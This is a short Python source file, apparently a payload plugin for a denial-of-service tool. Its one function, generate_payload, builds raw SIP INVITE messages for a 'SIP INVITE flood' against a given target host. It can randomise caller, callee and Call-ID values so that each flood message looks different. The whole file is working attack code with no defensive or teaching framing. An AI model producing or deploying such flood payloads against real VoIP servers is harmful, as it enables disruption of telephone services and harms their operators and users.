import random

def generate_payload(target, options=None):
    """
    SIP INVITE flood, supports random caller/callee.
    options:
      - caller: str
      - callee: str
      - mutate: bool
    """
    caller = options.get('caller', '1000') if options else '1000'
    callee = options.get('callee', '2000') if options else '2000'
    mutate = options.get('mutate', False) if options else False
    if mutate:
        caller = str(random.randint(1000,9999))
        callee = str(random.randint(1000,9999))
    payload = (
        f"INVITE sip:{callee}@{target} SIP/2.0\r\n"
        f"From: <sip:{caller}@{target}>\r\n"
        f"To: <sip:{callee}@{target}>\r\n"
        f"Call-ID: {random.randint(100000,999999)}@{target}\r\n"
        f"CSeq: 1 INVITE\r\n"
        f"Contact: <sip:{caller}@{target}>\r\n"
        f"Content-Length: 0\r\n\r\n"
    )
    return payload.encode()
